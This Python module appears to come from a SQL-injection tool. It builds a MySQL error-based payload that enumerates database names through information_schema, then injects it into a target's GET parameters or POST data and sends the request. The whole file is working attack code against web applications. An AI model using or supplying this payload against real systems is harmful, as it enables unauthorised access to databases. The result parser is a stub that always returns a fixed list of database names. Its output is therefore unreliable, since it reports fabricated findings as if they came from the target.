# modules/dbs.py

import requests

def enumerate(injector, return_list=False):
    """
    Enumerate databases by testing common payloads.

    If return_list=True, returns list of DB names instead of printing.
    """

    # Example payload for MySQL version and DB names enumeration (simplified)
    payload = "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- "

    url = injector.url
    method = injector.args.method
    data = injector.args.data
    headers = injector.headers
    session = injector.session

    # Inject payload into URL or data
    if method == 'GET':
        target_url = url.replace('=', '=' + payload)
        response = session.get(target_url, headers=headers)
    else:  # POST
        if not data:
            print("[!] POST method selected but no --data provided.")
            return [] if return_list else None
        injected_data = data.replace('=', '=' + payload)
        response = session.post(url, data=injected_data, headers=headers)

    # Basic response check (you will want to customize this)
    if "information_schema" in response.text:
        dbs_str = extract_databases(response.text)
        if return_list:
            return dbs_str.split(',')
        else:
            print("[+] Databases found: ", dbs_str)
    else:
        if not return_list:
            print("[-] Could not enumerate databases. Target might not be injectable.")

def extract_databases(response_text):
    """
    Parse response to extract database names.

    For now, this is a placeholder that assumes DB names are in the response text.
    """
    # This is a stub: real implementation depends on target response format.
    # Just a dummy example:
    return "information_schema,mysql,testdb"
